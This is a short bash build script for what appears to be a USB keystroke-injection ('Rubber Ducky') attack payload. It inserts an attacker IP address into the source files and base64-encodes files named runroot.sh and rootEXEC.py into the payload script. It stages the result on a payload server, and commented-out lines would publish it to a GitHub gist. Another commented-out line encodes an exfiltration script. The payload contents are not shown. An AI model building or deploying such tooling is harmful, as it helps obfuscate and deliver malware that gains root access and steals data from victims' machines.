#!/bin/bash

duckyPath=$(pwd)/src/ducky

# File to base64 encode rootExec.py and runroot.sh and replace them in rubbyDucky.sh within a build folder
rm -rf build
mkdir build
cd build

cp $duckyPath/* .

# replace <REPLACE_IP> with ip.txt 
sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" runroot.sh
sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" rubbyDucky.sh

# replace all <REPLACE_IP> in all files in build dir
find . -type f -exec sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" {} \;


base64 -w 0 runroot.sh > runroot.txt
base64 -w 0 rootEXEC.py > py.txt
# base64 -w 0 exfiltrate.py > exfiltrate.txt

# {RUNROOT_BASE64} in rubbyDucky.sh will be replaced with runroot.txt
# {PY_BASE64} in rubbyDucky.sh will be replaced with py.txt

sed -i "s/{RUNROOT_BASE64}/$(cat runroot.txt)/g" rubbyDucky.sh
sed -i "s/{PY_BASE64}/$(cat py.txt)/g" rubbyDucky.sh
# sed -i "s/{EXFILTRATE_BASE64}/$(cat exfiltrate.txt)/g" rubbyDucky.sh

echo "Created rubbyDucky.sh in build folder"

echo "uploading to gist now"

cp rubbyDucky.sh ../build_server/payloads


cp duckyLauncher.sh ../e3c7d56524bcba9a0eff319676611d5f/rubbyDucky.sh
cd ../e3c7d56524bcba9a0eff319676611d5f


# # run git
# git add .
# git commit -m "Updated rubbyDucky.sh"

# # increment revision number
# revNum=$(cat ../builder/revisionNum.txt)
# echo $((revNum+1)) > ../builder/revisionNum.txt

# ssh-agent bash -c 'ssh-add ../rubbyducky; git push git@gist.github.com:e3c7d56524bcba9a0eff319676611d5f.git'

# echo "uploaded to gist"

